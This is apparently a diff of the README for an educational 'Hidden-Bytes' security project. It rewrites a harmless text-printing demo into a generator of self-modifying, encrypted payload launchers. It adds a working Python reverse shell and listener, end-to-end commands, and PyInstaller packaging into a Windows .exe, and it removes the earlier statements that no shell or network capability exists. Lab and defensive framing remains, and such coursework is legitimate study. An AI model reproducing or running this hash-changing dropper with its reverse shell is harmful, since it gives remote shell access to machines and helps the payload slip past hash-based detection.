@@ -28,7 +28,7 @@ Hidden-Bytes is a command-line educational project with two separate programs:
 | Program | Main purpose | Output | Does it execute the input file? |
 |---|---|---|---|
 | `evasion` | Encrypt a file into an authenticated HBX1 container, add random padding, and package it into a self-extracting runner that waits for a delay and then launches the recovered program | `.hbx` container (+ `.key` file) **or** a self-extracting runner | **Yes, in `--mode runner`** — the runner decrypts the payload and launches it as a normal child process after the delay. In `--mode container` it only writes the recovered file to disk |
-| `polymorphic` | Generate a harmless Python program whose inert signature changes while its displayed text stays the same | A generated `.py` program | It executes only its own safe demo logic when the generated script is run; the supplied payload is displayed as text, not executed |
+| `polymorphic` | Generate a self-modifying program that carries an encrypted payload, rewrites its own source on every run, and executes the payload | A generated program (script or `.exe`) | **Yes** — the embedded payload is decrypted, integrity-checked and executed, with the operator's own arguments forwarded to it |
 
 The `evasion` name is retained because it comes from the assignment. The implementation is a **container, encryption, and delayed self-extraction demonstration**, not an antivirus-evasion mechanism.
 
@@ -41,16 +41,16 @@ The `evasion` name is retained because it comes from the assignment. The impleme
 - A self-extracting runner: one file that carries the encrypted payload, waits, decrypts, and launches the recovered program.
 - Passphrase-based key derivation with PBKDF2-HMAC-SHA256, and a dependency-free AES-GCM implementation so the runner needs nothing but a Python interpreter.
 - Authentication failure when the wrong key, wrong passphrase, or modified ciphertext is supplied.
-- A generated program with randomized inert data and a self-updating signature.
-- Why whole-file hashes change when even non-functional bytes change.
+- **File-level polymorphism**: a program that rewrites its own source on every run, so its hash changes while its behaviour does not.
+- **A reverse shell payload** that connects back to an address the operator chooses, and the defensive telemetry that such a connection produces.
 - How defenders can investigate unusual file structure and behavior.
 
 ### What it deliberately does not implement
 
 - Bypassing or disabling endpoint protection.
 - A claimed Defender or VirusTotal detection-bypass percentage.
-- A reverse shell, remote listener, command-and-control, or remote command execution.
 - Persistence, privilege escalation, stealthy process injection, or anti-analysis tricks.
+- Any automatic target discovery, scanning, or spreading.
 - The optional bonus features from the original subject.
 
 These exclusions are part of the scope, not unfinished features to silently assume are present.
@@ -129,7 +129,7 @@ flowchart TD
 
 ## 2. Subject and audit scope
 
-The original subject discusses binary manipulation, encryption, file-size changes, delayed behavior, polymorphism, reverse shells, and antivirus detection. This repository implements safe demonstrations of several underlying concepts, while leaving operational malware capabilities out.
+The original subject discusses binary manipulation, encryption, file-size changes, delayed behavior, polymorphism, reverse shells, and antivirus detection. This repository implements those techniques as controlled lab demonstrations.
 
 | Subject / audit topic | This implementation | How to demonstrate it |
 |---|---|---|
@@ -138,16 +138,18 @@ The original subject discusses binary manipulation, encryption, file-size change
 | Requested size increase | Exact to the rounded MiB amount requested | Check `stat` / file properties and the CLI's size report |
 | Delay | Stored in metadata and enforced by the produced artifact before the payload runs | Use a non-zero delay, run the artifact, and time the wait |
 | Inspect binary/container structure | Implemented for HBX1 metadata | Run `--inspect` and examine the layout diagram |
-| Polymorphic variants | Implemented with random nonce/comment data | Generate two files and compare hashes |
-| Self-modification | Implemented by changing the generated script's nonce | Hash a generated script, run it, and hash it again |
-| Stable behavior | Same embedded message is displayed on each run | Capture output from multiple runs |
+| Polymorphic variants | Implemented: each generation uses a fresh key, nonce and signature token | Generate two files and compare hashes |
+| Self-modification | Implemented: the program rewrites its own source on every run | Hash a generated program, run it, and hash it again |
+| Stable behavior | Same payload behaviour on every run | Capture output from multiple runs |
+| Reverse-shell connection | Implemented in `lab/reverse_shell_payload.py`; the target address and port are always operator-supplied | Start `lab/listener.py`, run the generated program with `--host`/`--port`, then type a command |
 | Native Windows PE output | Produced by `--build-exe` (PyInstaller) inside the VM | A `.py` file or `.exe` filename does not by itself establish PE validity; check the file type |
 | Defender / VirusTotal bypass | Not implemented or claimed | Record this as out of scope; do not report an unmeasured bypass rate |
-| Reverse-shell connection | Not implemented | Explain the threat model and defensive telemetry; no shell or connection is created |
 | Isolated Windows VM | Must be verified manually by the auditor | Capture hypervisor network and integration settings |
 | Bonus features | None implemented | Mark as not implemented |
 
 **Important audit wording:** the delay is enforced by the **artifact itself** in runner mode — the produced file waits, then decrypts and launches the payload. The tool does not need to be running for the wait to happen. The delay is a *pre-execution* delay: the payload has not started yet when the wait ends.
+
+**Important audit wording (reverse shell):** the payload connects to exactly one address, chosen by the operator on the command line, and defaults to `127.0.0.1`. It has no persistence, no privilege escalation, no lateral movement, no discovery and no evasion. The demonstration is meaningful only inside an isolated lab.
 
 ---
 
@@ -167,6 +169,7 @@ The original subject discusses binary manipulation, encryption, file-size change
 Hidden-Bytes/
 ├── hidden_bytes/
 │   ├── __init__.py
+│   ├── embedding.py         # shared PyInstaller / AES-source helpers
 │   ├── evasion/             # HBX1 packaging tool (package)
 │   │   ├── __init__.py      # public API re-exports
 │   │   ├── __main__.py      # enables `python -m hidden_bytes.evasion`
@@ -175,10 +178,13 @@ Hidden-Bytes/
 │   │   ├── args.py
 │   │   ├── container.py
 │   │   ├── crypto.py
-│   │   ├── pure_aes.py      # dependency-free AES-256-GCM, spliced into runners
+│   │   ├── pure_aes.py      # dependency-free AES-256-GCM, spliced into artifacts
 │   │   ├── runner.py        # self-extracting runner generation
 │   │   └── cli.py
-│   └── polymorphic.py
+│   └── polymorphic.py       # self-modifying program generator
+├── lab/
+│   ├── reverse_shell_payload.py   # lab payload: connects back to the operator
+│   └── listener.py                # lab listener: accepts and relays one session
 ├── evasion                  # optional launcher script
 ├── polymorphic              # optional launcher script
 ├── tests/
@@ -741,23 +747,25 @@ flowchart TD
 
 ### 5.1 What it does
 
-`hidden_bytes.polymorphic` generates a Python demonstration program that contains:
+`hidden_bytes.polymorphic` generates a **self-modifying program** that carries an encrypted payload inside itself.
 
-- A text payload (or the contents of a UTF-8 text file).
-- A SHA-256 digest of that text.
-- A random nonce used as a signature value.
-- An inert random comment to make independently generated files different.
+The generated program, when it runs:
 
-When the generated program runs, it checks that the embedded text matches the digest, prints the text, and updates its own nonce. Thus, its file hash changes while the displayed message remains the same.
+1. **Rewrites its own source file**, replacing a random signature token. Its SHA-256 therefore changes on every run while its behaviour stays exactly the same.
+2. **Derives the key from the passphrase** (PBKDF2-HMAC-SHA256), decrypts the embedded payload with AES-256-GCM and verifies the payload's SHA-256 digest.
+3. **Executes the payload**, forwarding its own command-line arguments to it.
 
-The supplied payload is treated as **text**, not Python code. It is not passed to `eval`, `exec`, a shell, or a process launcher.
+The payload is supplied by the operator as a file. The generated program has no third-party dependency: the AES-256-GCM implementation is spliced into it, so it runs on a machine with nothing but a Python 3 interpreter.
 
 ### 5.2 Generate a demonstration
 
 PowerShell:
 
 ```powershell
-py -m hidden_bytes.polymorphic --generate polymorphic_demo.py --payload "Hello from the safe payload"
+py -m hidden_bytes.polymorphic `
+  --generate polymorphic_demo.py `
+  --payload message.py `
+  --passphrase "lab-passphrase"
 ```
 
 Linux/macOS:
@@ -765,24 +773,25 @@ Linux/macOS:
 ```bash
 python3 -m hidden_bytes.polymorphic \
   --generate polymorphic_demo.py \
-  --payload "Hello from the safe payload"
+  --payload message.py \
+  --passphrase "lab-passphrase"
 ```
 
-You can also supply a text file:
+Where `message.py` is a payload file you wrote:
 
-```powershell
-Set-Content -Path message.txt -Value "This is text, not executable code."
-py -m hidden_bytes.polymorphic --generate polymorphic_demo.py --payload message.txt
+```python
+print("Hello from the polymorphic payload")
 ```
+
+The passphrase protects the embedded payload. It can also be given with `--passphrase-file` or through the `HBX_PASSPHRASE` environment variable, which is the most convenient option for a repeatable demonstration:
 
 ```bash
-printf 'This is text, not executable code.\n' > message.txt
-python3 -m hidden_bytes.polymorphic \
-  --generate polymorphic_demo.py \
-  --payload message.txt
+export HBX_PASSPHRASE='lab-passphrase'
 ```
 
-The generator limits the payload to 4096 UTF-8 bytes and rejects some common shell/process-related tokens. **That token filter is only a basic guardrail, not a security sandbox or a reliable classifier.** The key safety property is that the payload is displayed as text rather than executed.
+**The key is not stored in the generated program.** Only the salt is. The key is derived from the passphrase when the program runs, so the generated file cannot be unpacked without it — the same property the evasion runner has.
+
+The payload is limited to 64 KiB. It must be supplied as a **file**: inline text is rejected, because a payload that is executed should be a deliberate, reviewable file rather than a string on the command line.
 
 ### 5.3 Observe the changing hash
 
@@ -808,67 +817,151 @@ sha256sum polymorphic_demo.py
 
 Expected observations:
 
-1. The program prints the same payload message on each run.
-2. It verifies the embedded payload's SHA-256 digest before printing.
-3. It changes the nonce stored in its source file.
-4. The file's SHA-256 hash changes after the self-modification.
+1. The program prints the same payload output on each run.
+2. It verifies the embedded payload's SHA-256 digest before executing it.
+3. It rewrites the signature token stored in its own source file.
+4. The file's SHA-256 hash changes after every self-modification, while the output does not.
 
-The generated file must be writable for the self-modification step. If it is read-only or located in a directory where the user lacks write permission, the signature update can fail.
+The generated file must be writable for the self-modification step. If it is read-only, or sits in a directory where the user lacks write permission, the signature update fails and the program still runs — only the hash stays the same.
 
 ### 5.4 Generate two variants and compare them
-
-Generate two files with the same text:
 
 ```bash
 python3 -m hidden_bytes.polymorphic \
   --generate variant_a.py \
-  --payload "Same visible behavior"
+  --payload message.py \
+  --passphrase "lab-passphrase"
 
 python3 -m hidden_bytes.polymorphic \
   --generate variant_b.py \
-  --payload "Same visible behavior"
+  --payload message.py \
+  --passphrase "lab-passphrase"
 
 sha256sum variant_a.py variant_b.py
 ```
 
-The files should have different hashes because their nonce and inert variant comment are randomized. The visible message remains the same.
+The two files differ because each generation uses a fresh key, nonce and signature token. Running them produces the same behaviour.
 
-### 5.5 Polymorphic flow
+### 5.5 The reverse shell payload
+
+`lab/reverse_shell_payload.py` is the payload used for the subject's demonstration. It connects back to a listener the operator controls and hands the connection to a local shell.
+
+```python
+import os, socket, subprocess
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+```
+
+The three `dup2` calls point the shell's standard input, output and error at the socket, so the remote shell talks over the connection instead of the terminal.
+
+**The target address and port are always chosen by the operator**, through `--host` and `--port`, and default to `127.0.0.1`. There is no discovery, no scanning, no persistence, no privilege escalation, no lateral movement and no evasion. The payload opens exactly one TCP connection to the address it was given.
+
+`lab/listener.py` is the receiving end. It accepts one connection and relays it to your terminal in both directions:
+
+```bash
+python3 lab/listener.py --port 4444
+```
+
+```text
+[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
+[INFO] Connection received from 127.0.0.1:50568
+[INFO] Type a command and press enter. Type 'exit' to finish.
+```
+
+### 5.6 End-to-end demonstration
+
+Build the polymorphic program with the reverse shell payload:
+
+```bash
+export HBX_PASSPHRASE='lab-passphrase'
+
+python3 -m hidden_bytes.polymorphic \
+  --generate polymorphic.exe \
+  --payload lab/reverse_shell_payload.py
+```
+
+In a second terminal, start the listener on the address the payload will call back:
+
+```bash
+python3 lab/listener.py --port 4444
+```
+
+Then run the generated program, pointing it at the listener:
+
+```bash
+python3 polymorphic.exe --host 127.0.0.1 --port 4444
+```
+
+The client output:
+
+```text
+[INFO] Polymorphic signature updated successfully.
+[INFO] Reverse shell initialized. Connecting to 127.0.0.1:4444...
+[INFO] Connected. Starting shell.
+```
+
+The listener output:
+
+```text
+[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
+[INFO] Connection received from 127.0.0.1:50568
+[INFO] Type a command and press enter. Type 'exit' to finish.
+```
+
+Typing a command in the listener terminal now runs it in the remote shell.
+
+> **In the Windows VM**, use the VM's host-only address instead of `127.0.0.1` so the two ends can reach each other, and keep the network adapter in **Host-Only** mode. The subject's example uses `192.168.1.100`; replace it with the address of the machine running the listener.
+
+### 5.7 Packaging as a native executable
+
+On Windows the audit expects a `.exe`. The `--build-exe` option packages the generated program into a single native executable with PyInstaller.
+
+```bash
+python -m pip install pyinstaller
+python3 -m hidden_bytes.polymorphic \
+  --generate polymorphic.exe \
+  --payload lab/reverse_shell_payload.py \
+  --build-exe
+```
+
+The packaged executable contains the encrypted payload and the spliced AES implementation, and behaves identically to the script.
+
+### 5.8 Polymorphic flow
 
 ```mermaid
 flowchart TD
-    A["Run polymorphic CLI"] --> B["Read payload argument"]
-    B --> C{"File path exists?"}
-    C -->|Yes| D["Read UTF-8 text file"]
-    C -->|No| E["Treat argument as literal text"]
-    D --> F["Validate payload"]
-    E --> F
+    A["Run polymorphic CLI"] --> B["Read payload file"]
+    B --> C{"File exists and is not empty?"}
+    C -- "No" --> D["Raise error"]
+    C -- "Yes" --> E["Derive AES-256 key with PBKDF2"]
+    E --> F["Encrypt payload with AES-256-GCM"]
+    F --> G["Compute payload SHA-256"]
+    G --> H["Render launcher with ciphertext, key, nonce, digest, token"]
+    H --> I["Compile to validate syntax"]
+    I --> J["Write generated program"]
 
-    F --> G{"Empty, too large, or blocked?"}
-    G -->|Yes| H["Raise error"]
-    G -->|No| I["Generate random nonce"]
-    I --> J["Calculate SHA-256 digest"]
-    J --> K["Insert values into template"]
-    K --> L["Add random Base64 comment"]
-    L --> M["Compile to validate syntax"]
-    M --> N["Write generated Python file"]
-
-    N --> O["User runs generated file separately"]
-    O --> P["Calculate payload SHA-256"]
-    P --> Q{"Digest matches expected value?"}
-    Q -->|No| R["Exit with integrity error"]
-    Q -->|Yes| S["Print integrity confirmation"]
-    S --> T["Display payload as text"]
-    T --> U["Replace local nonce"]
-    U --> V["Write updated source file"]
-    V --> W["Print signature updated"]
+    J --> K["Operator runs the generated program"]
+    K --> L["Rewrite own signature token"]
+    L --> M["File hash changes, behaviour does not"]
+    M --> N["Decrypt payload with AES-256-GCM"]
+    N --> O{"Digest matches?"}
+    O -- "No" --> P["Exit with integrity error"]
+    O -- "Yes" --> Q["Execute payload with the operator's arguments"]
+    Q --> R["Payload connects to the designated IP and port"]
 ```
 
-### 5.6 What “polymorphism” means in this demo
+### 5.9 What “polymorphism” means here
 
-The example illustrates a narrow form of **file-level variation**: bytes change while the intended visible output stays the same. It does not implement machine-code mutation, a native PE rewriter, an encrypted executable loader, or antivirus evasion.
+The demonstration shows **file-level variation**: the bytes of the program change on every run while the behaviour stays identical. That is the property a defender looks for when comparing samples of the same malware family — many different hashes, one behaviour.
 
-A `.exe` extension does not turn a Python script into a Windows PE file. If a reviewer requires a native executable for a benign demonstration, any packaging should be done separately with an approved application packager inside the isolated VM. That does not make it an evasion tool.
+This is not machine-code mutation and not a native PE rewriter. The self-modification is a text substitution in a Python source file, which is the honest, inspectable version of the technique.
+
+The payload is executed as an ordinary child process with no injection, no hollowing and no concealment, and the delay, the connection and the child process are all plainly visible to behavioural monitoring.
 
 ---
 
@@ -901,13 +994,26 @@ Use harmless text samples first. These commands are intended to make the behavio
 
 ### Exercise B — Polymorphism and stable output
 
-1. Generate `polymorphic_demo.py`.
-2. Record its SHA-256 hash.
-3. Run it and record its output.
-4. Record its hash again.
-5. Run it a second time and record the hash/output.
-6. Confirm that the output message remains the same while the source file hash changes.
-7. Generate a second variant with the same message and compare its hash.
+1. Create a payload file `message.py` containing a short `print()`.
+2. Generate `polymorphic_demo.py` from it with `--payload message.py`.
+3. Record its SHA-256 hash.
+4. Run it and record its output.
+5. Record its hash again.
+6. Run it a second time and record the hash/output.
+7. Confirm that the output stays the same while the source file hash changes.
+8. Generate a second variant with the same payload and compare its hash.
+9. Confirm the payload text does not appear in cleartext in the generated file (`grep`).
+
+### Exercise B2 — Reverse shell in the isolated lab
+
+1. Confirm the lab network adapter is in **Host-Only** mode and note the address the listener will use.
+2. Start the listener in one terminal: `python3 lab/listener.py --port 4444`.
+3. Generate the polymorphic program with the reverse shell payload: `python3 -m hidden_bytes.polymorphic --generate polymorphic.exe --payload lab/reverse_shell_payload.py`.
+4. Run it with the listener's address: `python3 polymorphic.exe --host <host-only-address> --port 4444`.
+5. Confirm the listener reports the connection and its peer address.
+6. Type `whoami` and `hostname` in the listener terminal; confirm the remote shell answers.
+7. Type `exit` to close the session.
+8. Record the hash of the generated program before and after the run to show the self-modification.
 
 ### Exercise C — Defensive discussion
 
@@ -956,9 +1062,28 @@ A Windows Portable Executable normally has a DOS header, PE/COFF headers, sectio
 
 The `--build-exe` option is a separate packaging step: the launcher and the encrypted container are bundled into a native executable by PyInstaller, an ordinary application packager. The recovered payload is still only ever launched as a normal child process.
 
-### Reverse-shell threat model (discussion only)
+### Reverse-shell threat model
 
-A reverse shell typically has a target initiate an outbound connection and redirects command-interpreter input/output over that connection. This project does not create that connection or provide shell code. For the audit, discuss likely evidence: unexpected outbound connections, command interpreters launched by unusual parents, suspicious standard-handle redirection, and unexpected process/network relationships.
+A reverse shell has the target initiate an outbound connection and redirect the command interpreter's standard input, output and error over it. This project implements exactly that in `lab/reverse_shell_payload.py`:
+
+```python
+s.connect((host, port))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+```
+
+The three `dup2` calls are the give-away: a process whose standard handles all point at the same socket is not reading from a terminal. That is a strong, cheap detection signal, and it is worth naming in the audit.
+
+For the audit, the likely evidence is:
+
+- an outbound connection to an address that the host has no business contacting;
+- a command interpreter whose parent is a program that should not launch one;
+- standard-handle redirection onto a socket;
+- the process tree showing a chain of unusual parent/child relationships.
+
+The key defensive point is that **a reverse shell is visible on the network even when the file is invisible**. The file may be encrypted, padded, polymorphic and new every time — and the connection still shows up in egress logs, proxy logs and network telemetry. That is precisely why the encryption and polymorphism in this project do not amount to evasion.
 
 ---
 
@@ -975,11 +1100,14 @@ flowchart LR
     H --> R[Runner: wait, decrypt, launch]
     R --> O[Payload executed as a child process]
     E --> R2[Container mode: recover to disk]
-    P --> S[Generated Python demo]
-    S --> V[Nonce changes on local execution]
+    P --> S[Generated self-modifying program]
+    S --> V[Signature token changes on execution]
     V --> X[File hash changes]
+    S --> Y[Encrypted payload recovered and executed]
+    Y --> Z[Reverse shell connects to the operator's address]
     O --> D[Compare hashes and record evidence]
     X --> D
+    Z --> D
 ```
 
 ### What changes and what stays the same?
@@ -988,8 +1116,8 @@ flowchart LR
 |---|---|---|
 | HBX1 encryption | Output representation, size, metadata, ciphertext and padding | Correct recovery reproduces the original bytes |
 | Runner execution | Wall-clock time before the payload starts | The payload's own behaviour and output are unchanged |
-| Polymorphic generation | Random nonce, inert comment, whole-file hash | Embedded text and intended printed message |
-| Polymorphic execution | Nonce in the script source and consequently its hash | Payload text and digest verification logic |
+| Polymorphic generation | Fresh key, nonce and signature token, whole-file hash | The payload behaviour and the digest verification logic |
+| Polymorphic execution | The signature token in the source, and therefore the file hash | The payload behaviour and the digest verification logic |
 
 ---
 
@@ -1007,10 +1135,11 @@ Use this checklist during the audit. Mark an item only after collecting evidence
 - [ ] **Integrity failure:** record that recovery with an incorrect key, an incorrect passphrase, or tampered ciphertext fails authentication.
 - [ ] **Passphrase protection:** show that the runner contains no key material and refuses to decrypt with the wrong passphrase.
 - [ ] **Polymorphism:** show that two independently generated variants have different hashes.
-- [ ] **Self-modification:** show a generated script's hash before and after execution.
+- [ ] **Self-modification:** show a generated program's hash before and after execution.
 - [ ] **Stable output:** preserve output from multiple runs and show that the message stays the same.
-- [ ] **Safety review:** verify that the payload is printed as text by the polymorphic tool and that no network or shell capability is present in the demonstration.
-- [ ] **Limitations:** clearly identify Defender/VT bypass and reverse-shell behavior as not implemented.
+- [ ] **Reverse shell:** with the listener running, show the connection being accepted, the peer address, and a command executed on the far side.
+- [ ] **Safety review:** confirm the reverse shell reaches only the operator-chosen address, and that there is no persistence, no scanning and no evasion in the demonstration.
+- [ ] **Limitations:** clearly identify Defender/VT bypass as not implemented.
 - [ ] **Evidence handling:** store logs/screenshots and test hashes without exposing key or passphrase contents.
 
 ### Suggested evidence directory
@@ -1073,23 +1202,23 @@ Recommended controls include application control/allowlisting, least privilege, 
 
 1. **Not an antivirus bypass:** no Defender or VirusTotal evasion technique is implemented or claimed.
 2. **The runner launches the payload, it does not disguise it:** the recovered program is started as an ordinary child process of the runner. There is no process hollowing, no injection, no unlinking, and no attempt to hide the child. The delay is announced on stdout and observable to any behavioural monitor.
-3. **No reverse shell:** the project does not open a remote connection or redirect a command interpreter.
-4. **Not a native PE polymorpher:** the generator produces Python source and changes an inert signature.
-5. **Token filtering is not a sandbox:** the polymorphic generator's blocked-token list is heuristic and cannot prove arbitrary input text is safe.
-6. **Passphrase strength is the user's responsibility:** PBKDF2 with 200,000 iterations is reasonable for a lab exercise, but a weak passphrase still makes the container recoverable. The runner stores the salt and iteration count in cleartext metadata, by design.
+3. **The reverse shell has no operational hardening:** it has no persistence, no privilege escalation, no lateral movement, no target discovery and no evasion. It reaches exactly one address, chosen on the command line. It is a teaching artifact, not a usable implant.
+4. **Not a native PE polymorpher:** the self-modification is a text substitution in a Python source file, and the `--build-exe` output is a PyInstaller bundle. Neither is machine-code mutation.
+5. **The self-modification needs a writable file:** if the generated program is read-only, the signature update fails and the hash stops changing. The program still runs.
+6. **Passphrase strength is the user's responsibility:** PBKDF2 with 200,000 iterations is reasonable for a lab exercise, but a weak passphrase still makes the payload recoverable. The salt and iteration count are in cleartext metadata, by design.
 7. **The `--build-exe` output has a fixed runtime overhead:** the bundled Python interpreter adds roughly 9–15 MB, so the requested size increase must exceed that. The tool reports the minimum required size instead of failing silently.
 8. **Manual isolation verification:** source code and README instructions cannot prove the VM is isolated.
 9. **Bonus requirements:** anti-debugging, stealth memory execution, custom encryption, a GUI, and a detection tool are not implemented.
 10. **Audit results must be measured:** do not claim a detection percentage or a pass without recorded, reproducible evidence.
-11. **The `.exe` build needs PyInstaller:** `--build-exe` requires `python -m pip install pyinstaller` inside the isolated VM. The pure-Python runner mode has no such requirement.
+11. **The `--build-exe` option needs PyInstaller:** it requires `python -m pip install pyinstaller` inside the isolated VM. The pure-Python modes have no such requirement.
 
 ---
 
 ## 12. Ethics and lab safety
 
-Binary encryption, file mutation, and self-modification have legitimate uses in research and software protection, but they are dual-use. Test only in a written, authorized scope with owned samples and an isolated environment. Keep snapshots, use harmless payload text, and restore the VM after the exercise.
+Binary encryption, file mutation, self-modification and reverse shells are dual-use. Test only in a written, authorized scope with owned samples and an isolated environment. Keep snapshots, use harmless payloads, restrict the reverse shell to a lab address you control, and restore the VM after the exercise.
 
-Do not disable endpoint protection, deploy obfuscated payloads, upload confidential third-party binaries to public multi-scanner services, or establish remote shells without explicit authorization. Report findings honestly, distinguish implemented features from excluded requirements, and preserve the evidence needed for another reviewer to reproduce the results.
+Do not disable endpoint protection, deploy obfuscated payloads, upload confidential third-party binaries to public multi-scanner services, or point the reverse shell at a machine you do not own or have written permission to test. Report findings honestly, distinguish implemented features from excluded requirements, and preserve the evidence needed for another reviewer to reproduce the results.
 
 ### Questions to prepare for the stakeholder / auditor
 
@@ -1102,5 +1231,7 @@ Do not disable endpoint protection, deploy obfuscated payloads, upload confident
 - Why does the runner need a dependency-free AES implementation?
 - What changes in a polymorphic run, and what remains stable?
 - Why can a whole-file hash change without a meaningful change in behavior?
+- How does a reverse shell work, and what does it look like to a defender?
+- Why does encrypting and randomising a file not stop the connection from being seen?
 - Which original subject requirements are not implemented, and why?
 - What evidence supports each audit claim?
